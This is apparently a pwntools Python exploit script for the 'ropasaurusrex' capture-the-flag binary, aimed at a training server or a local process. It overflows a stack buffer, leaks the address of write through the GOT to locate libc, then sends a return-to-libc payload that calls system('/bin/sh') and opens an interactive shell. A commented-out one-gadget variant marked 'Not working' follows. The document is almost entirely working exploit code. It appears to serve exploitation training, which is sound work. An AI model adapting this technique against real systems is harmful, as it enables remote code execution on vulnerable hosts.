from pwn import *
import sys

binary = ELF("./ropasaurusrex")
libc = ELF("./libc-2.27.so")
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 2 and sys.argv[1] == 'attack':
    r = remote('bin.training.jinblack.it', 2014)
else:
    r = process('./ropasaurusrex')
    gdb.attach(r, '''
        b *0x0804841c
        c
    ''')


input('press a key..')

what_to_write = binary.got["write"]
where_to_jump = binary.plt["write"]

payload = b'A' * 136
payload += b'BBBB'          #EBP
payload += p32(where_to_jump) #EIP
payload += p32(binary.entry)  #Return address of where_to_jump function
#args of write
payload += p32(1)
payload += p32(what_to_write)
payload += p32(4)

r.sendline(payload)

leak = u32(r.recv(4))
write_offset = libc.symbols["write"]
libc_base = leak - write_offset

print("LIBC base -> " + hex(libc_base))

# EXPLOIT CALLING SYSTEM
system_offset = libc.symbols["system"]
bin_sh_offset = next(libc.search(b'/bin/sh'))
 
payload = b'A' * 136
payload += b'BBBB'
payload += p32(libc_base + system_offset)
payload += b"CCCC"
payload += p32(libc_base + bin_sh_offset)

r.sendline(payload)

r.interactive()


# EXPLOIT USING GADGET (Not working)
""" 
'''
0x137e5e execl("/bin/sh", eax)
constraints:
  ebx is the GOT address of libc
  eax == NULL

'''

payload = b"A" * 136
payload += p32(libc_base + 0x1d8000)
payload += p32(libc_base + 0x137e5e)
payload += b"\x00\x00\x00\x00"

r.sendline(payload)
r.interactive()
 """

    

